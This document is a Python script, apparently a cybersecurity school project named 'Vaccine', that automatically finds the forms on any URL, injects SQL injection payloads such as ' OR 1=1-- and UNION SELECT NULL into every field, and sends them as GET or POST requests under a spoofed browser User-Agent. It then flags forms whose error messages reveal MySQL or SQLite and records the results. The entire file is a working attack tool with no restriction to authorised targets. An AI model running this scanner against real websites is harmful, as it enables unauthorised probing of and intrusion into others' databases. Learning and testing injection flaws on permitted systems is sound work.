#!/usr/bin/env python3

import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import json
import sys

# keep session open
s = requests.Session()
# you make the website believe that the request comes from a real user using a browser.
s.headers["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"


# return all forms found
def get_forms(url):
    q = BeautifulSoup(s.get(url).content, "html.parser")
    return q.find_all("form")

# Exemple 
# [
#     <form action="/submit_login" method="post">
#         <input type="text" name="username" value="">
#         <input type="password" name="password" value="">
#         <input type="submit" value="Login">
#     </form>,
    
#     <form action="/submit_signup" method="post">
#         <input type="text" name="username" value="">
#         <input type="password" name="password" value="">
#         <input type="email" name="email" value="">
#         <input type="submit" value="Sign Up">
#     </form>
# ]

# returns a detailed dictionary form
def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append(
            {"type": input_type, "name": input_name, "value": input_value}
        )
    detailsOfForm["action"] = action
    detailsOfForm["method"] = method
    detailsOfForm["inputs"] = inputs
    return detailsOfForm

# detailsOfForm  = {
#     "action": "http://example.com/submit_signup",
#     "method": "post",
#     "inputs": [
#         {"type": "text", "name": "username", "value": ""},
#         {"type": "password", "name": "password", "value": ""},
#         {"type": "email", "name": "email", "value": ""}
#     ]
# }

def vulnerable(response):
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unrecognized token",
        "sqlite error",
        "fatal error",
        "mysqli_sql_exception"
    ]
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False


def detect_db_type(response):
    db_types = {
        "mysql": "mysql",
        "sqlite": "sqlite",
    }
    content = response.content.decode().lower()
    for db, signature in db_types.items():
        if signature in content:
            return db
    return "unknown"


def sqli_tests(url, form_details, method):
    # Payloads for different SQL injection methods
    payloads = {
        "Union": "' UNION SELECT NULL--",
        "Error": "' OR 1=1--",
        "Boolean": "' OR '1'='1'--"
    }
    detected_vulnerabilities = []

    for test, payload in payloads.items():
        data = {}
        for input_tag in form_details["inputs"]:
            print('\n')
            print(f"INPUT TAG: {input_tag}")
            print('\n')
            if input_tag["type"] == "hidden" or input_tag["value"]:
                data[input_tag["name"]] = input_tag["value"] + payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test{payload}"

        form_action_url = urljoin(url, form_details["action"])
        if method == 'POST':
            print(f"LA DATATATATATATTA: {data}")
            r = s.post(form_action_url, data=data)
        else:
            r = s.get(form_action_url, params=data)

        if vulnerable(r):
            db_type = detect_db_type(r)
            detected_vulnerabilities.append({
                "method": test,
                "url": form_action_url,
                "payload": data,
                "db_type": db_type
            })

    return detected_vulnerabilities


def save_to_archive(data, filename):
    if not os.path.exists(filename):
        with open(filename, 'w') as f:
            json.dump([], f)

    with open(filename, 'r') as f:
        existing_data = json.load(f)

    existing_data.extend(data)

    with open(filename, 'w') as f:
        json.dump(existing_data, f, indent=4)


def SQLi(url, req_method, archive_file):
    forms = get_forms(url)
    print(f"[+] {len(forms)} forms found on {url}.")
    all_vulnerabilities = []
    for form in forms:
        form_details_dict = form_details(form)
        vulnerabilities = sqli_tests(url, form_details_dict, req_method)
        all_vulnerabilities.extend(vulnerabilities)

    if all_vulnerabilities:
        save_to_archive(all_vulnerabilities, archive_file)
        for vuln in all_vulnerabilities:
            print(f"SQLi attack detected: {vuln['url']}")
            print(f"Payload used: {vuln['payload']}")
            print(f"Database type: {vuln['db_type']}")
    else:
        print("No SQLi vulnerabilities detected.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='Vaccine',
        description='Vaccine which allows you to perform an SQL injection by providing a URL as parameter.',
        epilog='42 Cybersecurity')

    parser.add_argument('URL', type=str, help='The URL of the website to perform SQL injection')
    parser.add_argument('-o', type=str, default="archive", help='Archive file, if not specified it will be stored in a default one.')
    parser.add_argument('-X', type=str, default="GET", help='Type of request, if not specified GET will be used.')

    args = parser.parse_args()
    if args.X != 'POST' and args.X != 'GET':
        print("Error: method not accepted")
        sys.exit(1)
        
    print(args)

    SQLi(args.URL, args.X, args.o)
